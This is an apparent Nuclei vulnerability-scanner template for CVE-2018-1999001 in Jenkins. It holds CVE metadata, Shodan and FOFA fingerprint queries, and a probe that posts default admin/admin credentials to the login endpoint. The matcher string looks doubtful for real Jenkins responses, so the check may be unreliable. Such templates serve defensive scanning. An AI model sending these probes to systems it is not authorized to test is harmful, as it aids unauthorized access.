id: CVE-2018-1999001

info:
  name: Jenkins Unauthorized Configuration Modification
  author: ProjectDiscoveryAI
  severity: high
  description: A unauthorized modification of configuration vulnerability exists in Jenkins 2.132 and earlier, 2.121.1 and earlier in User.java that allows attackers to provide crafted login credentials that cause Jenkins to move the config.xml file from the Jenkins home directory. If Jenkins is started without this file present, it will revert to the legacy defaults of granting administrator access to anonymous users.
  impact: |
    Unauthorized users can make configuration changes, potentially leading to system compromise.
  remediation: |
    Ensure proper access controls are in place to prevent unauthorized modification of Jenkins configurations.
  reference:
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/huimzjty/vulwiki
    - https://github.com/superfish9/pt
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2018-1999001
    epss-score: 0.00703
    epss-percentile: 0.80916
    cpe: cpe:2.3:a:jenkins:jenkins:*:*:*:*:*:*:*:*
  metadata:
    vendor: jenkins
    product: jenkins
    shodan-query: http.favicon.hash:81586312
    fofa-query: icon_hash=81586312

http:
  - method: POST
    path:
      - "{{BaseURL}}/j_acegi_security_check"

    body: "j_username=admin&j_password=admin&Submit=Sign+in"

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "administrator access granted"
        part: body
